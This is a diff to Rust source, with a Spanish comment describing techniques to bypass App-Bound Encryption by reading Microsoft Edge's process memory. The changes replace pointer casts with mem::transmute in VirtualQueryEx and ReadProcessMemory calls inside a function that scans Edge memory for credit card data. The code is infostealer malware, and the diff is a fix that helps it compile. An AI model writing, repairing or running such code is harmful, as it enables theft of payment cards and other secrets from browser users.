@@ -2,6 +2,7 @@
 // Técnicas avanzadas para bypassear App-Bound Encryption leyendo memoria de Edge
 
 use std::mem;
+use winapi::ctypes::c_void;
 use winapi::um::winnt::{HANDLE, PROCESS_VM_READ, PROCESS_QUERY_INFORMATION, MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};
 use winapi::um::processthreadsapi::OpenProcess;
 use winapi::um::handleapi::CloseHandle;
@@ -143,7 +144,7 @@ where
             let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
             let query_result = VirtualQueryEx(
                 edge.handle,
-                address as LPVOID,
+                mem::transmute(address),
                 &mut mbi as *mut MEMORY_BASIC_INFORMATION,
                 mem::size_of::<MEMORY_BASIC_INFORMATION>()
             );
@@ -173,7 +174,7 @@ where
                     
                     let result = ReadProcessMemory(
                         edge.handle,
-                        region_addr as LPVOID,
+                        mem::transmute(region_addr),
                         buffer.as_mut_ptr() as LPVOID,
                         CHUNK_SIZE,
                         &mut bytes_read as *mut usize
@@ -270,7 +271,7 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
             let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
             let query_result = VirtualQueryEx(
                 edge.handle,
-                address as *const _ as LPVOID,
+                mem::transmute(address),
                 &mut mbi as *mut MEMORY_BASIC_INFORMATION,
                 mem::size_of::<MEMORY_BASIC_INFORMATION>()
             );
@@ -308,7 +309,7 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
                     // ReadProcessMemory
                     let result = ReadProcessMemory(
                         edge.handle,
-                        region_addr as *mut _ as LPVOID,
+                        mem::transmute(region_addr),
                         buffer.as_mut_ptr() as LPVOID,
                         CHUNK_SIZE,
                         &mut bytes_read as *mut usize
